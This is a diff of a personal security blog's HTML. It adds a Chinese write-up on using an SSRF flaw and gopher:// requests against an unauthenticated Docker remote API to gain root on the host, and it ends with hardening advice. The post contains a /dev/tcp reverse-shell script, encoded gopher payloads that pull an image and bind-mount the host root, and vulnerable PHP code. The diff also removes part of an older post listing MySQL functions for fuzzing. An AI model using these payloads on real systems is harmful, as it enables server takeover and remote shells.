@@ -317,6 +317,262 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/SSRF-DOCKER-RCE/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/SSRF-DOCKER-RCE/index.html" itemprop="url">
+                  利用SSRF攻击docker remote api从而获取服务器root权限的探索
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-08-16 08:57:59" itemprop="dateCreated datePublished" datetime="2018-08-16T08:57:59+08:00">2018-08-16</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>首发于freebuf <a href="http://www.freebuf.com/articles/web/179910.html">http://www.freebuf.com/articles/web/179910.html</a></p>
+</blockquote>
+<blockquote>
+<p>这几天在做关于自动化部署docker镜像方面的项目，从而接触到了docker的api，而docker的api也可以通过tcp连接的形式来进行访问。那么从一个安全爱好者的角度出发，是否可以利用docker的远程api来实现提权等一系列的操作？查找了各种资料之后，最后我探索到了一条通过SSRF漏洞来攻击docker远程api从而最终还能够获得远程主机的root权限的攻击思路，并写了这篇文章来记录一下整个过程及其防范的方法。</p>
+</blockquote>
+<h2 id="什么是docker远程api？"><a href="#什么是docker远程api？" class="headerlink" title="什么是docker远程api？"></a>什么是docker远程api？</h2><p>Docker Remote API是docker团队为了方便我们远程管理docker而为我们提供的一套api接口。在默认的情况下，docker daemon坚挺在unix socket上，通常为unix:///var/run/docker.sock。此外，在一些情况比如当我们需要远程管理docker服务器或者是创建docker集群的情况下，我们往往需要开启docker的远程api。这里给出在ubuntu上的一种开启方法：</p>
+<ul>
+<li>编辑<code>/lib/systemd/system/docker.service</code>文件，修改ExecStart一行为：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Type=notify</span><br><span class="line"># the default is not to use systemd for cgroups because the delegate issues still</span><br><span class="line"># exists and systemd currently does not support the cgroup feature set required</span><br><span class="line"># for containers run by docker</span><br><span class="line">ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243</span><br><span class="line">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class="line">LimitNOFILE=1048576</span><br></pre></td></tr></table></figure>
+<ul>
+<li>之后再重启docker</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure>
+<p>我们便可以利用docker client或者任意http客户端访问docker服务，例如<img src="http://image.3001.net/images/20180806/1533549633_5b681c41397a8.png!small" alt="docker_remote.png"></p>
+<p>可以看到docker提供的api其实也是一个restful形式的http接口，具体的文档可以再docker的官网获取：<a href="https://docs.docker.com/engine/api/v1.24/#31-containers">Engine API V1.24</a></p>
+<p>这里列出几个重要的接口：</p>
+<ul>
+<li>列出所有的容器</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http:/localhost:4243/v1.24/containers/json</span><br></pre></td></tr></table></figure>
+<ul>
+<li>列出所有镜像</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http:/localhost:4243/v1.24/images/json[&#123;</span><br><span class="line">  &quot;Id&quot;:&quot;sha256:31d9a31e1dd803470c5a151b8919ef1988ac3efd44281ac59d43ad623f275dcd&quot;,</span><br><span class="line">  &quot;ParentId&quot;:&quot;sha256:ee4603260daafe1a8c2f3b78fd760922918ab2441cbb2853ed5c439e59c52f96&quot;,</span><br><span class="line">  ...</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>创建并运行容器</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ curl  -H &quot;Content-Type: application/json&quot; \</span><br><span class="line">  -d &apos;&#123;&quot;Image&quot;: &quot;alpine&quot;, &quot;Cmd&quot;: [&quot;echo&quot;, &quot;hello world&quot;]&#125;&apos; \</span><br><span class="line">  -X POST http:/localhost:4243/v1.24/containers/create</span><br><span class="line">&#123;&quot;Id&quot;:&quot;1c6594faf5&quot;,&quot;Warnings&quot;:null&#125;</span><br><span class="line"></span><br><span class="line">$ curl   -X POST http:/localhost:4243/v1.24/containers/1c6594faf5/start</span><br><span class="line"></span><br><span class="line">http:/localhost:4243/v1.24/containers/1c6594faf5/wait</span><br><span class="line">&#123;&quot;StatusCode&quot;:0&#125;</span><br><span class="line"></span><br><span class="line">$ curl  &quot;http:/localhost:4243/v1.24/containers/1c6594faf5/logs?stdout=1&quot;</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<p>可以看到如果开放了docker远程api，我们便可以使用restful接口来实现一切docker容器的操作。</p>
+<h2 id="怎样利用docker容器提权？"><a href="#怎样利用docker容器提权？" class="headerlink" title="怎样利用docker容器提权？"></a>怎样利用docker容器提权？</h2><p>有些朋友可能会问了：docker容器内部是一个虚拟化的环境，与主机隔离，那么怎样才能利用docker容器达到主机的控制权？这里就涉及到docker运行时的用户权限了。<code>docker daemon</code>运行时是以root用户运行，因而具有极大的权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ps aux|grep dockerd</span><br><span class="line">root      1723  0.1  0.8 563472 68900 ?        Ssl  17:17   0:24 /usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243</span><br><span class="line">image    25504  0.0  0.0  15984   936 pts/3    S+   21:12   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn dockerd</span><br></pre></td></tr></table></figure>
+<p>那么怎样通过docker daemon最终获得服务器的root权限？这里我们可以利用docker挂载宿主机文件的功能，直接挂载高权限目录，从而在容器内部获取宿主机的控制权限。这里有一个黑魔法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>
+<p>运行后的输出如下：<img src="http://image.3001.net/images/20180806/1533549670_5b681c66b2a75.png!small" alt="verify">我们退出docker,查看宿主机/root/目录：<img src="http://image.3001.net/images/20180806/1533549678_5b681c6ee6b4c.png!small" alt="success">可以看到我们成功写入了/root文件夹一个文件。上面那条命令 <code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code>主要的作用是：从 Docker Hub 上面下载我们指定的镜像，然后运行。参数 -v 将容器外部的目录 / 挂载到容器内部 /hostOS，并且使用 -i 和 -t 参数进入容器的 shell。而这个镜像<code>rootplease</code>在容器内部执行了一个脚本<code>exploit.sh</code>，主要内容便是chroot到/hostOS中。这样我们便通过读写宿主机的任意文件实现了获取宿主机的最高权限。这个镜像的源码可以在<a href="https://github.com/chrisfosterelli/dockerrootplease/blob/master/exploit.sh">Github</a>上获取。</p>
+<h2 id="怎样通过SSRF完成攻击？"><a href="#怎样通过SSRF完成攻击？" class="headerlink" title="怎样通过SSRF完成攻击？"></a>怎样通过SSRF完成攻击？</h2><p>这里我们的服务器端环境如下:</p>
+<p><img src="http://image.3001.net/images/20180806/1533549693_5b681c7d2b544.png!small" alt="environ"></p>
+<p>这里我们来看在php中经常出现的导致SSRF漏洞的代码实现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$curl=curl_init();</span><br><span class="line">curl_setopt($curl,CURLOPT_URL,$_GET[&apos;url&apos;]);</span><br><span class="line">curl_setopt($curl,CURLOPT_HEADER,0);</span><br><span class="line">curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);</span><br><span class="line">$data=curl_exec($curl);</span><br><span class="line">curl_close($curl);</span><br><span class="line">print_r($data);</span><br></pre></td></tr></table></figure>
+<p>php中通常使用libcurl来实现http请求，这里可以看到<code>$_GET[&#39;url&#39;]</code>可控，从而可以请求任意站点，从而构成了SSRF漏洞。但是有的读者有可能会问：docker的api有很大一部分是需要post的，那么怎样才能发送post封包？这里便祭出我们的大杀器——<code>gopher协议</code>。Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。 这里Ricterz师傅曾经写过一篇很好的<a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2">关于gopher协议扩展ssrf攻击面的文章</a>。因此我们便可以通过gopher协议来访问内网开放的<code>docker api</code>从而实现攻击。我们可以先尝试获取所有的镜像：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@1ae6b62d1757:/var/www/html# curl localhost/curl.php?url=http://172.17.0.1:4243/containers/json</span><br><span class="line">[&#123;&quot;Id&quot;:&quot;fa169d6b4239882bb6a0a2d564fd9891c04cf199ac12daec514f69febf960e9b&quot;,&quot;Names&quot;:[&quot;/quirky_mcnulty&quot;],&quot;Image&quot;:&quot;chrisfosterelli/rootplease&quot;,&quot;ImageID&quot;:&quot;sha256:0db941813769383d7ed3bdcccd27af1b6d7b47ed0fb33f1b47f7bb937529fa3e&quot;,&quot;Command&quot;:&quot;/bin/bash exploit.sh&quot;,&quot;Created&quot;:1533475418,&quot;Ports&quot;:[],&quot;Labels&quot;:&#123;&#125;,&quot;State&quot;:&quot;running&quot;,&quot;Status&quot;:&quot;Up 17 minutes&quot;,&quot;HostConfig&quot;:&#123;&quot;NetworkMode&quot;:&quot;default&quot;&#125;,&quot;NetworkSettings&quot;:&#123;&quot;Networks&quot;:&#123;&quot;bridge&quot;:&#123;&quot;IPAMConfig&quot;:null,&quot;Links&quot;:null,&quot;Aliases&quot;:null,&quot;NetworkID&quot;:&quot;9a8a2dd6afbbc355194a5fd224757ac8fe11760dbfde91c07c46689146e15089&quot;,&quot;EndpointID&quot;:&quot;a079ba4ac68eafb5add6b56822dd13a288ca059a815e7a011e82bdcb8fd8542b&quot;,&quot;Gateway&quot;:&quot;172.17.0.1&quot;,&quot;IPAddress&quot;:&quot;172.17.0.4&quot;,&quot;IPPrefixLen&quot;:16,&quot;IPv6Gateway&quot;:&quot;&quot;,&quot;GlobalIPv6Address&quot;:&quot;&quot;,&quot;GlobalIPv6PrefixLen&quot;:0,&quot;MacAddress&quot;:&quot;02:42:ac:11:00:04&quot;,&quot;DriverOpts&quot;:null&#125;&#125;&#125;,&quot;Mounts&quot;:[&#123;&quot;Type&quot;:&quot;bind&quot;,&quot;Source&quot;:&quot;/&quot;,&quot;Destination&quot;:&quot;/hostOS&quot;,&quot;Mode&quot;:&quot;&quot;,&quot;RW&quot;:true,&quot;Propagation&quot;:&quot;rslave&quot;&#125;]&#125;,]</span><br></pre></td></tr></table></figure>
+<p>我们可以先构造一个特殊的docker镜像，并将之上传到DockerHub</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:14.04</span><br><span class="line">COPY exploit.sh /exploit.sh</span><br><span class="line">ENTRYPOINT [&quot;/bin/bash&quot;, &quot;exploit.sh&quot;]</span><br></pre></td></tr></table></figure>
+<p>这里我们的exploit.sh的写法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/$1/$2 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>这里的docker镜像已经上传到了<a href="https://hub.docker.com/r/imagemlt/reverse_shell/">dockerhub</a>。</p>
+<p>之后我们可以先构造合适的post封包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/images/create?fromImage=imagemlt/reverse_shell HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">X-Registry-Auth: e30=</span><br></pre></td></tr></table></figure>
+<p>这个post封包的目标是让远程主机从dockerhub下载我们需要的镜像。构造为gopher格式为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.17.0.1:4243/_POST%20/v1.24/images/create%3FfromImage%3Dimagemlt/reverse_shell%20HTTP/1.1%0AHost%3A%20localhost%3A4243%0AUser-Agent%3A%20Docker-Client/18.03.1-ce%20%28linux%29%0AContent-Length%3A%200%0AContent-Type%3A%20text/plain%0A X-Registry-Auth:%20e30%3D%0A%0A</span><br></pre></td></tr></table></figure>
+<p>通过ssrf的点触发即可在远程服务器下载我们的镜像。<img src="http://image.3001.net/images/20180806/1533549895_5b681d4734a8a.png!small" alt="pull.png"></p>
+<p><img src="./pull.png" alt=""></p>
+<p>之后再创建容器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/containers/create HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;Cmd&quot;:[&quot;your ip&quot;,&quot;3456&quot;],&quot;Image&quot;:&quot;imagemlt/reverse_shell&quot;,&quot;HostConfig&quot;:&#123;&quot;Binds&quot;:[&quot;/:/hostOS&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>将封包包装为gopher的形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.17.0.1:4243/_POST%20/v1.24/containers/create%20HTTP/1.1%0AHost%3A%20localhost%3A4243%0AUser-Agent%3A%20Docker-Client/18.03.1-ce%20%28linux%29%0AContent-Length%3A%2099%0AContent-Type%3A%20application/json%0A%0A%7B%22Cmd%22%3A%5B%22your ip%22%2C%223456%22%5D%2C%22Image%22%3A%22imagemlt/reverse_shell%22%2C%22HostConfig%22%3A%7B%22Binds%22%3A%5B%22/%3A/hostOS%22%5D%7D%7D%0A%0d%0a</span><br></pre></td></tr></table></figure>
+<p>这里我们再最后多加了一些%0d%0a从而让连接能够断开。然后利用之前的ssrf的地方请求这个url，可以获得创建的容器id：<img src="http://image.3001.net/images/20180806/1533549978_5b681d9a90183.png!small" alt="create.png"></p>
+<p><img src="./create.png" alt=""></p>
+<p>获取id后我们再post相应的使容器运行的封包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/containers/5a42a09f7bb889f53943015346682388d40a151ec5bad30024282eee11811380/start HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
+<p>我们的服务器端nc端口3456，构造gopher格式的url候再次发送封包：</p>
+<p><img src="http://image.3001.net/images/20180806/1533550032_5b681dd030497.png!small" alt="attack.png"><img src="http://image.3001.net/images/20180806/1533550043_5b681ddb80ec8.png!small" alt="getshell.png"></p>
+<p><img src="./attack.png" alt="">可以看到服务器端成功返回shell，且已成功挂载宿主机根目录到/hostOS下。</p>
+<p><img src="./getshell.png" alt=""></p>
+<p>这样我们便通过ssrf与docker未授权api完成了一次攻击，并且获取了宿主机的root权限！</p>
+<p>除了反弹shell的方法，我们也可以借助写crontab的方法来获得最后的shell，这里便不再赘述。</p>
+<h2 id="如何防范？"><a href="#如何防范？" class="headerlink" title="如何防范？"></a>如何防范？</h2><p>在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：</p>
+<ul>
+<li><p>设置ACL，仅允许信任的来源IP连接；</p>
+</li>
+<li><p>设置TLS认证，官方的文档为Protect the Docker daemon socket</p>
+</li>
+</ul>
+<p>客户端与服务器端通讯的证书生成后，可以通过以下命令启动docker daemon：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -d --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=tcp://10.10.10.10:2375 -H unix:///var/run/docker.sock</span><br></pre></td></tr></table></figure>
+<p>客户端连接时需要设置以下环境变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export DOCKER_TLS_VERIFY=1</span><br><span class="line">export DOCKER_CERT_PATH=~/.docker</span><br><span class="line">export DOCKER_HOST=tcp://10.10.10.10:2375</span><br><span class="line">export DOCKER_API_VERSION=1.12</span><br></pre></td></tr></table></figure>
+<p>这样便可以避免未授权的docker api被远程利用。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>未授权的docker remote api具有极大的风险，当结合ssrf漏洞时可以作为渗透测试扩展供给面的工具，最后获得root shell.因此我们做开发时应该严格防范。最后总结一下我们的攻击思路：</p>
+<p><img src="http://image.3001.net/images/20180806/1533550066_5b681df2b82f9.png!small" alt="flow.png"></p>
+<p><img src="./flow.png" alt=""></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://sec.xiaomi.com/article/22">https://sec.xiaomi.com/article/22</a></li>
+<li><a href="http://dockone.io/article/401">http://dockone.io/article/401</a></li>
+<li><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/redis源码-dict-h-dict-c/index.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2387,493 +2643,6 @@ deal(sys.argv[<span class="number">1</span>])
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/mysql-functions/index.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/mysql-functions/index.html" itemprop="url">
-                  mysql中的所有函数汇总（Fuzz用）
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-04-15 22:04:35" itemprop="dateCreated datePublished" datetime="2018-04-15T22:04:35+08:00">2018-04-15</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <pre><code>[u&apos;ABS()&apos;, u&apos;ACOS()&apos;, u&apos;ADDDATE()&apos;, u&apos;ADDTIME()&apos;, u&apos;AES_DECRYPT()&apos;, u&apos;AES_ENCRYPT()&apos;, u&apos;AND, &amp;&amp;&apos;, u&apos;Area()&apos;, u&apos;AsBinary(), AsWKB()&apos;, u&apos;ASCII()&apos;, u&apos;ASIN()&apos;, u&apos;=&apos;, u&apos;:=&apos;, u&apos;AsText(), AsWKT()&apos;, u&apos;ATAN()&apos;, u&apos;ATAN2(), ATAN()&apos;, u&apos;AVG()&apos;, u&apos;BENCHMARK()&apos;, u&apos;BETWEEN ... AND ...&apos;, u&apos;BIN()&apos;, u&apos;BINARY&apos;, u&apos;BIT_AND()&apos;, u&apos;BIT_COUNT()&apos;, u&apos;BIT_LENGTH()&apos;, u&apos;BIT_OR()&apos;, u&apos;BIT_XOR()&apos;, u&apos;&amp;&apos;, u&apos;~&apos;, u&apos;|&apos;, u&apos;^&apos;, u&apos;CASE&apos;, u&apos;CAST()&apos;, u&apos;CEIL()&apos;, u&apos;CEILING()&apos;, u&apos;Centroid()&apos;, u&apos;CHAR()&apos;, u&apos;CHAR_LENGTH()&apos;, u&apos;CHARACTER_LENGTH()&apos;, u&apos;CHARSET()&apos;, u&apos;COALESCE()&apos;, u&apos;COERCIBILITY()&apos;, u&apos;COLLATION()&apos;, u&apos;COMPRESS()&apos;, u&apos;CONCAT()&apos;, u&apos;CONCAT_WS()&apos;, u&apos;CONNECTION_ID()&apos;, u&apos;Contains()&apos;, u&apos;CONV()&apos;, u&apos;CONVERT()&apos;, u&apos;CONVERT_TZ()&apos;, u&apos;COS()&apos;, u&apos;COT()&apos;, u&apos;COUNT()&apos;, u&apos;COUNT(DISTINCT)&apos;, u&apos;CRC32()&apos;, u&apos;Crosses()&apos;, u&apos;CURDATE()&apos;, u&apos;CURRENT_DATE(), CURRENT_DATE&apos;, u&apos;CURRENT_TIME(), CURRENT_TIME&apos;, u&apos;CURRENT_TIMESTAMP(), CURRENT_TIMESTAMP&apos;, u&apos;CURRENT_USER(), CURRENT_USER&apos;, u&apos;CURTIME()&apos;, u&apos;DATABASE()&apos;, u&apos;DATE()&apos;, u&apos;DATE_ADD()&apos;, u&apos;DATE_FORMAT()&apos;, u&apos;DATE_SUB()&apos;, u&apos;DATEDIFF()&apos;, u&apos;DAY()&apos;, u&apos;DAYNAME()&apos;, u&apos;DAYOFMONTH()&apos;, u&apos;DAYOFWEEK()&apos;, u&apos;DAYOFYEAR()&apos;, u&apos;DECODE()&apos;, u&apos;DEFAULT()&apos;, u&apos;DEGREES()&apos;, u&apos;DES_DECRYPT()&apos;, u&apos;DES_ENCRYPT()&apos;, u&apos;Dimension()&apos;, u&apos;Disjoint()&apos;, u&apos;DIV&apos;, u&apos;/&apos;, u&apos;ELT()&apos;, u&apos;ENCODE()&apos;, u&apos;ENCRYPT()&apos;, u&apos;EndPoint()&apos;, u&apos;Envelope()&apos;, u&apos;=&apos;, u&apos;&lt;=&gt;&apos;, u&apos;Equals()&apos;, u&apos;EXP()&apos;, u&apos;EXPORT_SET()&apos;, u&apos;ExteriorRing()&apos;, u&apos;EXTRACT()&apos;, u&apos;ExtractValue()&apos;, u&apos;FIELD()&apos;, u&apos;FIND_IN_SET()&apos;, u&apos;FLOOR()&apos;, u&apos;FORMAT()&apos;, u&apos;FOUND_ROWS()&apos;, u&apos;FROM_DAYS()&apos;, u&apos;FROM_UNIXTIME()&apos;, u&apos;GeomCollFromText(), GeometryCollectionFromText()&apos;, u&apos;GeomCollFromWKB(), GeometryCollectionFromWKB()&apos;, u&apos;GeometryCollection()&apos;, u&apos;GeometryN()&apos;, u&apos;GeometryType()&apos;, u&apos;GeomFromText(), GeometryFromText()&apos;, u&apos;GeomFromWKB(), GeometryFromWKB()&apos;, u&apos;GET_FORMAT()&apos;, u&apos;GET_LOCK()&apos;, u&apos;GLength()&apos;, u&apos;&gt;&apos;, u&apos;&gt;=&apos;, u&apos;GREATEST()&apos;, u&apos;GROUP_CONCAT()&apos;, u&apos;HEX()&apos;, u&apos;HOUR()&apos;, u&apos;IF()&apos;, u&apos;IFNULL()&apos;, u&apos;IN()&apos;, u&apos;INET_ATON()&apos;, u&apos;INET_NTOA()&apos;, u&apos;INSERT()&apos;, u&apos;INSTR()&apos;, u&apos;InteriorRingN()&apos;, u&apos;Intersects()&apos;, u&apos;INTERVAL()&apos;, u&apos;IS&apos;, u&apos;IS_FREE_LOCK()&apos;, u&apos;IS NOT&apos;, u&apos;IS NOT NULL&apos;, u&apos;IS NULL&apos;, u&apos;IS_USED_LOCK()&apos;, u&apos;IsClosed()&apos;, u&apos;IsEmpty()&apos;, u&apos;ISNULL()&apos;, u&apos;IsSimple()&apos;, u&apos;LAST_DAY&apos;, u&apos;LAST_INSERT_ID()&apos;, u&apos;LCASE()&apos;, u&apos;LEAST()&apos;, u&apos;LEFT()&apos;, u&apos;&lt;&lt;&apos;, u&apos;LENGTH()&apos;, u&apos;&lt;&apos;, u&apos;&lt;=&apos;, u&apos;LIKE&apos;, u&apos;LineFromText(), LineStringFromText()&apos;, u&apos;LineFromWKB(), LineStringFromWKB()&apos;, u&apos;LineString()&apos;, u&apos;LN()&apos;, u&apos;LOAD_FILE()&apos;, 